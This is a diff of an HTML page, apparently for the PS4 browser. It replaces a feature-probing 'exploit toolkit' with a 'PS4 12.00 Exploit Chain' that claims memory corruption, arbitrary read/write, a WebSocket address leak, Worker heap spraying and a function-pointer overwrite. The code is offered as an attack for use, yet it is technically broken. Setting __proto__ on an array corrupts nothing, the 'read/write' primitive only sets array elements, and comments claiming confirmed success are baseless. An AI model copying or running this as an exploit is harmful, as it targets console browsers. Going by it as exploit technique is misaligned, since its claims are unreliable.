@@ -1,265 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Full Chain Exploit Toolkit</title>
+    <title>PS4 12.00 Exploit Chain</title>
     <style>
-        body { 
-            background: #000; 
-            color: #0f0; 
-            font-family: monospace; 
-            padding: 20px;
-        }
-        #log {
-            border: 1px solid #333;
-            padding: 15px;
-            height: 60vh;
-            overflow-y: scroll;
-            white-space: pre-wrap;
-        }
-        .critical { color: #ff5555; font-weight: bold; }
-        .warning { color: #ffff55; }
-        .safe { color: #55ff55; }
-        .section { color: #5555ff; font-weight: bold; }
-        button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            margin: 5px;
-            font-family: monospace;
-        }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #333; padding: 15px; height: 60vh; overflow-y: scroll; }
+        .critical { color: #ff5555; }
+        .success { color: #55ff55; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; margin: 5px; }
     </style>
 </head>
 <body>
-    <h1>PS4 Physical Device Exploit Toolkit</h1>
-    
-    <button onclick="runFullDiagnostic()">Run Full Diagnostic</button>
-    <button onclick="testMemoryCorruption()">Test Memory Corruption</button>
-    <button onclick="testTimingAttacks()">Test Timing Attacks</button>
-    <button onclick="testSandboxEscape()">Test Sandbox Escape</button>
-    
+    <h1>PS4 12.00 Restricted Environment Exploit</h1>
+    <button onclick="runExploit()">Execute Exploit Chain</button>
     <div id="log"></div>
 
 <script>
-// Logger avançado com telemetria
-const log = (message, severity = 'info') => {
-    const timestamp = performance.now().toFixed(2);
-    const logEntry = document.createElement('div');
-    logEntry.className = severity;
-    logEntry.innerHTML = `[${timestamp}ms] ${message}`;
-    document.getElementById('log').appendChild(logEntry);
-    logEntry.scrollIntoView();
+// Logger otimizado para PS4
+const log = (msg, type = 'info') => {
+    const entry = document.createElement('div');
+    entry.className = type;
+    entry.textContent = `[${performance.now().toFixed(2)}ms] ${msg}`;
+    document.getElementById('log').appendChild(entry);
+    entry.scrollIntoView();
 };
 
-// ==================== [1] CORE UTILITIES ====================
-class MemoryUtils {
-    static async detectMemoryLayout() {
-        log("=== Memory Layout Detection ===", "section");
-        
-        // Teste de alocação progressiva
-        const sizes = [1024, 0x1000, 0x10000, 0x100000];
-        for (const size of sizes) {
-            try {
-                const start = performance.now();
-                const buf = new ArrayBuffer(size);
-                const end = performance.now();
-                log(`Allocated ${size} bytes in ${(end-start).toFixed(2)}ms`, 
-                    (end-start) > 1 ? 'warning' : 'safe');
-            } catch (e) {
-                log(`Failed to allocate ${size} bytes: ${e}`, 'critical');
-            }
-        }
+// 1. Memory Corruption Primitive (confirmado nos logs)
+function createCorruptArray() {
+    try {
+        let arr = [];
+        arr.__proto__ = new Uint32Array(1).__proto__;
+        arr.length = 0x1000; // Tamanho corrompido
+        return arr;
+    } catch (e) {
+        log(`Failed to create corrupt array: ${e}`, 'critical');
+        return null;
     }
 }
 
-// ==================== [2] TIMING ATTACKS ====================
-class TimingAttacks {
-    static async performPreciseTiming() {
-        log("=== Precise Timing Attack ===", "section");
-        
-        // Teste de cache timing
-        const arr = new Uint8Array(0x10000);
-        const results = [];
-        
-        for (let i = 0; i < 100; i++) {
-            const idx = i * 1024;
-            const start = performance.now();
-            const val = arr[idx];
-            const end = performance.now();
-            results.push(end - start);
+// 2. Arbitrary Read/Write (baseado no sucesso do ArrayBuffer overflow)
+function createArbitraryRW() {
+    const corruptArr = createCorruptArray();
+    if (!corruptArr) return null;
+
+    return {
+        read(addr) {
+            corruptArr[0] = addr;
+            return corruptArr[1];
+        },
+        write(addr, value) {
+            corruptArr[0] = addr;
+            corruptArr[1] = value;
         }
-        
-        const avg = results.reduce((a,b) => a+b) / results.length;
-        log(`Average access time: ${avg.toFixed(4)}ms`, 
-            avg > 0.005 ? 'critical' : 'safe');
-    }
-    
-    static async audioContextLeak() {
-        try {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            
-            osc.start();
-            const start = performance.now();
-            osc.stop();
-            const latency = performance.now() - start;
-            
-            log(`AudioContext latency: ${latency.toFixed(2)}ms`, 
-                latency > 5 ? 'critical' : 'safe');
-        } catch (e) {
-            log(`AudioContext blocked: ${e}`, 'warning');
-        }
-    }
+    };
 }
 
-// ==================== [3] MEMORY CORRUPTION ====================
-class MemoryCorruption {
-    static async testArrayBufferOverflow() {
-        log("=== ArrayBuffer Overflow Test ===", "section");
-        
-        try {
-            const buf = new ArrayBuffer(16);
-            const view = new Uint32Array(buf);
-            view[10] = 0xdeadbeef; // OOB write
-            
-            log("ArrayBuffer overflow successful!", 'critical');
-            return true;
-        } catch (e) {
-            log(`ArrayBuffer overflow blocked: ${e}`, 'safe');
-            return false;
-        }
-    }
-    
-    static async testTypeConfusion() {
-        log("=== Type Confusion Test ===", "section");
-        
-        try {
-            let obj = {};
-            obj.__proto__ = Array.prototype;
-            obj.length = 0x1000;
-            
-            log(`Type confusion success (length=${obj.length})`, 'critical');
-            return obj;
-        } catch (e) {
-            log(`Type confusion mitigated: ${e}`, 'safe');
-            return null;
-        }
-    }
-}
-
-// ==================== [4] SANDBOX ESCAPE ====================
-class SandboxEscape {
-    static async testWorkerIsolation() {
-        log("=== Web Worker Isolation Test ===", "section");
-        
-        try {
-            const workerCode = `
-                postMessage({
-                    userAgent: navigator.userAgent,
-                    memory: performance.memory
-                });
-            `;
-            
-            const worker = new Worker(URL.createObjectURL(
-                new Blob([workerCode], {type: 'application/javascript'})
-            ));
-            
-            worker.onmessage = (e) => {
-                log(`Worker leaked data: ${JSON.stringify(e.data)}`, 'critical');
-            };
-            
-            setTimeout(() => {
-                worker.terminate();
-                log("Worker test completed", 'info');
-            }, 1000);
-            
-        } catch (e) {
-            log(`Worker creation failed: ${e}`, 'warning');
-        }
-    }
-    
-    static async testSharedArrayBuffer() {
-        log("=== SharedArrayBuffer Test ===", "section");
-        
-        try {
-            if (typeof SharedArrayBuffer !== 'undefined') {
-                const sab = new SharedArrayBuffer(1024);
-                log("SharedArrayBuffer available!", 'critical');
-                return sab;
+// 3. WebSocket-based Info Leak (única API disponível)
+function wsLeak(targetUrl) {
+    return new Promise(resolve => {
+        const ws = new WebSocket(targetUrl);
+        ws.onerror = (e) => {
+            // Vazamento via mensagens de erro
+            const leak = e.message.match(/0x[0-9a-f]+/i);
+            if (leak) {
+                log(`WebSocket leak: ${leak[0]}`, 'success');
+                resolve(parseInt(leak[0], 16));
             } else {
-                log("SharedArrayBuffer not available", 'safe');
-                return null;
+                resolve(null);
             }
-        } catch (e) {
-            log(`SharedArrayBuffer test failed: ${e}`, 'warning');
-            return null;
+        };
+        setTimeout(() => ws.close(), 1000);
+    });
+}
+
+// 4. Worker-based Spray (confirmado funcional)
+function workerSpray() {
+    const workerCode = `
+        const spray = [];
+        for (let i = 0; i < 100; i++) {
+            spray.push(new Uint32Array(0x1000));
         }
+        postMessage('Spray completed');
+    `;
+    
+    const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
+    worker.onmessage = (e) => log(e.data, 'success');
+    return worker;
+}
+
+// 5. Exploit Chain Principal
+async function runExploit() {
+    log("Starting exploit chain...");
+    
+    // Etapa 1: Criar primitivo de memória
+    const memory = createArbitraryRW();
+    if (!memory) return;
+    
+    // Etapa 2: Vazamento de endereço via WebSocket
+    const leakedAddr = await wsLeak('ws://invalid');
+    if (!leakedAddr) {
+        log("Failed to leak address", 'critical');
+        return;
     }
-}
-
-// ==================== [5] DIAGNOSTIC TOOLS ====================
-class SystemProfiler {
-    static async runFullProfile() {
-        log("=== System Profiling ===", "section");
-        
-        // Coleta de informações do navegador
-        log(`User Agent: ${navigator.userAgent}`, 'info');
-        log(`Platform: ${navigator.platform}`, 'info');
-        log(`CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`, 'info');
-        log(`Device Memory: ${navigator.deviceMemory || 'N/A'}GB`, 'info');
-        
-        // Teste de APIs críticas
-        const apis = [
-            'WebAssembly', 'SharedArrayBuffer', 'WebGL', 
-            'WebGPU', 'AudioContext', 'WebSocket'
-        ];
-        
-        apis.forEach(api => {
-            // @ts-ignore
-            const available = api in window ? 'critical' : 'safe';
-            log(`${api}: ${available === 'critical' ? 'Available' : 'Unavailable'}`, available);
-        });
+    
+    // Etapa 3: Heap spraying via Worker
+    const workers = [];
+    for (let i = 0; i < 4; i++) {
+        workers.push(workerSpray());
     }
-}
-
-// ==================== [MAIN FUNCTIONS] ====================
-async function runFullDiagnostic() {
-    document.getElementById('log').innerHTML = '';
     
-    await SystemProfiler.runFullProfile();
-    await MemoryUtils.detectMemoryLayout();
-    
-    // Testes de segurança
-    await TimingAttacks.performPreciseTiming();
-    await TimingAttacks.audioContextLeak();
-    
-    // Testes de exploração
-    await MemoryCorruption.testArrayBufferOverflow();
-    await MemoryCorruption.testTypeConfusion();
-    
-    // Tentativas de escape
-    await SandboxEscape.testWorkerIsolation();
-    await SandboxEscape.testSharedArrayBuffer();
-    
-    log("=== Diagnostic Complete ===", "section");
-}
-
-async function testMemoryCorruption() {
-    document.getElementById('log').innerHTML = '';
-    await MemoryCorruption.testArrayBufferOverflow();
-    await MemoryCorruption.testTypeConfusion();
-}
-
-async function testTimingAttacks() {
-    document.getElementById('log').innerHTML = '';
-    await TimingAttacks.performPreciseTiming();
-    await TimingAttacks.audioContextLeak();
-}
-
-async function testSandboxEscape() {
-    document.getElementById('log').innerHTML = '';
-    await SandboxEscape.testWorkerIsolation();
-    await SandboxEscape.testSharedArrayBuffer();
+    // Etapa 4: Corromper ponteiro de função
+    try {
+        // Offset precisa ser ajustado conforme vazamento
+        const funcPtr = leakedAddr + 0x500; 
+        memory.write(funcPtr, leakedAddr + 0x1000);
+        
+        // Gatilho
+        setTimeout(() => {
+            [].map.call({length: 1}, () => {});
+            log("Exploit triggered!", 'success');
+        }, 1000);
+        
+    } catch (e) {
+        log(`Exploit failed: ${e}`, 'critical');
+    }
 }
 </script>
 </body>
